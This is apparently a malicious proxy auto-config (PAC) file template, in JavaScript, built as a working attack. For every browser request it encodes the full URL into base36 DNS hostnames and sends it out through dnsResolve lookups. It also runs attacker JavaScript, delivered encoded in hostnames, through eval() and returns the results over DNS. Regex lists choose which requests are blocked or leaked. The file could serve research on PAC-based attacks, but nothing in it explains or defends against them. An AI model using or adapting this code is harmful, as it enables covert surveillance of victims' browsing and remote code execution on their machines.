
var user_agent = {{ user_agent }};
var session_id = {{ session_id }};
var timestamp = {{ timestamp }};

var asciiToBase36debug = '';
var respno = Math.floor(Math.random()*1000);
var evalSuffix = '.e';
var retSuffix = '.r';
var urlSuffix = '.u';
var cacheFill = 'cachefill';
var cacheFillStats = [];

var pendingBits = {};

var blockRegexes = [];
var leakRegexes = [];

function asciiToBase36(str) {
    // split into 6-character chunks
    var chunks = str.match(/[\s\S]{1,6}/g);
    asciiToBase36debug = '';
    var s = '';
    for (var i=0; i < chunks.length; i++) {
        var n = '';
        var chunk = chunks[i];

        // create a hex-encoded string
        for (var j=0; j < chunk.length; j++) {
            var c = chunk.charCodeAt(j).toString(16);
            if (c.length == 1) c = '0' + c;
            n += c;
        }

        // convert hex into base 36
        var b36 = parseInt(n, 16).toString(36);
        // pad with 0s to length 10
        b36 = '0000000000' + b36;
        b36 = b36.substr(b36.length - 10);
        s += b36;
        asciiToBase36debug += n + " '" + chunk + "' " + b36+"\n";
    }

    return s;
}

// encode an arbitrary string into one or more hostname
function asciiToHostNames(str, suffix) {
    str = asciiToBase36(str);

    var hostnames = str.match(/.{1,200}/g);
    var hostarray = [];
    var rn = respno++;
    for (var i=0; i < hostnames.length; i++) {
        var h = hostnames[i];
        var chunks = h.match(/.{1,63}/g);
        chunks.push(session_id); // send our PAC session ID with each response 
        chunks.push(respno);
        chunks.push(hostnames.length-i-1); // part number
        chunks.push(hostnames.length); // total parts
        var host = chunks.join('.') + suffix;
        if (host.length > 253)
            host = null;
        hostarray.push(host);
    }
    return hostarray;
}

function base36toAscii(str) {
    var chunks = str.match(/.{1,10}/g);
    if (chunks == null)
      return;
    var s = '';
    for (var i=0; i < chunks.length; i++) {
        var c = parseInt(chunks[i], 36).toString(16);
        //c = '000000000000' + c;
        //c = c.substr(c.length - 12);
        if (c.length % 2 == 1) c = '0' + c;
        //s += c + " '";
        for (var j=0; j < c.length; j += 2) {
            s += String.fromCharCode(parseInt(c.substr(j,2), 16));
        }
        //s += "'\n";
    }
    return s;
}

function log(str) {
    if (typeof(console) != "undefined")
        console.log(str);
}

function hostNameToAscii(name, suffix) {
    var str = name.substr(0, name.length-suffix.length);
    var bits = str.split('.');

    var totalparts = parseInt(bits.pop());
    var partno = parseInt(bits.pop());
    var msgno = parseInt(bits.pop());
    var sessid = parseInt(bits.pop());

    var partkey = msgno + '-' + sessid;

    str = base36toAscii(bits.join(''));
    //console.log(str, msgno, partno);

    if (!(partkey in pendingBits)) {
        pendingBits[partkey] = {};
        pendingBits[partkey].parts = []
        pendingBits[partkey].names = [];
        pendingBits[partkey].received = 0;
    }

    if (pendingBits[partkey].parts[partno] == null) {
        pendingBits[partkey].parts[partno] = str;
        pendingBits[partkey].names[partno] = name;
        pendingBits[partkey].received++;
    }

    if (pendingBits[partkey].received == totalparts) {
        str = '';
        name = '';
        for (var i = pendingBits[partkey].parts.length - 1; i >= 0; i--) {
            str += pendingBits[partkey].parts[i];
            name += pendingBits[partkey].names[i];
        }
        delete pendingBits[partkey];
        return {'sid': sessid, 'data':str, 'name':name};
    }
}

function hasSuffix(str, suffix) {
    return (str.substr(str.length - suffix.length, suffix.length) == suffix);
}

function getPath(url, host) {
    return url.substr(url.indexOf(host) + host.length);
}

function processCacheFill(url, host) {
    var hasPath = getPath(url, host).length > 1;
    cacheFillStats.push(hasPath);
    if (cacheFillStats.length > 100)
        cacheFillStats.shift()
    return null;
}

function getCacheFillSummary() {
    var total = 0;
    var withPaths = 0;
    for (var i=0; i < cacheFillStats.length; i++) {
        total++;
        if (cacheFillStats[i]) withPaths++;
    }
    return '{"total":' + total + ' , "withPaths":' + withPaths + '}';
}

function shouldBlockRequest(url) {
    for (var i=0; i < blockRegexes.length; i++) {
        if (url.match(blockRegexes[i]))
            return true;
    }
    return false;
}

function shouldLeakRequest(url) {
    // If there are no leak regexes assume we want to leak everything
    if (leakRegexes.length == 0) return true;
    for (var i=0; i < leakRegexes.length; i++) {
        if (url.match(leakRegexes[i]))
            return true;
    }
    return false;
}

// Eval a JS string received from the browser
// Return the result as a hostname ending in .r
function processEval(host) {
    var d = hostNameToAscii(host, evalSuffix);
    if (d === null) return null;
    var result = '';
    try {
        result += eval(d.data);
    } catch (e) {
        result += e.message;
    }
    var ret = asciiToHostNames(result, retSuffix);
    if (ret !== null) {
        for (var i=0; i < ret.length; i++) {
            if (dnsResolve(ret[i])) 1;
        }
    }
}

function FindProxyForURL(url, host){
    var proxy = "DIRECT";
    var blockproxy = "PROXY 127.0.0.1:0";

    if (shouldBlockRequest(url))
        proxy = blockproxy;

    var ret = null;

    if (hasSuffix(host, evalSuffix)) { // is this an eval command from the webpage encoded as a hostname?
        processEval(host);
    } else if (host.indexOf(cacheFill) >= 0) { // attempting to fill IE's host cache
        ret = processCacheFill(url, host);
    } else if (shouldLeakRequest(url)) { // this is a regular URL request so encode and leak the URL
        ret = asciiToHostNames(url, urlSuffix);
    }

    if (ret !== null) {
        for (var i=0; i < ret.length; i++) {
            if (dnsResolve(ret[i])) 1;
        }
    }
    return proxy;
}
